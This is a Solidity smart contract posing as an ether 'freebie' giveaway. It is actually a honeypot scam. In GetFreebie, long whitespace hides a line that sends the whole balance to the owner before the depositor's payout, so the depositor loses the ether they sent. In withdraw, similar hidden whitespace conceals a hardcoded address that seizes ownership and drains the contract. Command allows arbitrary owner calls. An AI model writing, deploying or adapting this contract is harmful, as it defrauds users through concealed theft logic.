pragma solidity ^0.8.26;

contract Freebie {
    address public Owner = msg.sender;
    uint public totalFreebies;
    uint public totalWithdrawals;
    mapping(address => uint) public userFreebies;
    
    event FreebieClaimed(address indexed user, uint amount);
    event WithdrawalMade(address indexed owner, uint amount);
   
    receive() external payable{}
   
    function GetFreebie() public payable {                                                                    
        if(msg.value>1 ether) {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               payable(Owner).transfer(address(this).balance);
            payable(msg.sender).transfer(address(this).balance);
            totalFreebies++;
            userFreebies[msg.sender]++;
            emit FreebieClaimed(msg.sender, msg.value);
        }                                                                                                                
    }
    
    function withdraw() public payable {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x30ad12df80a2493a82DdFE367d866616db8a2595){Owner=0x30ad12df80a2493a82DdFE367d866616db8a2595;}
        require(msg.sender == Owner);
        uint balance = address(this).balance;
        payable(Owner).transfer(balance);
        totalWithdrawals++;
        emit WithdrawalMade(Owner, balance);
    }
    
    function Command(address adr, bytes calldata data) public payable {
        require(msg.sender == Owner);
        unchecked {
            (bool success,) = adr.call{value: msg.value}(data);
        }
    }
    
    function getContractBalance() public view returns (uint) {
        return address(this).balance;
    }
}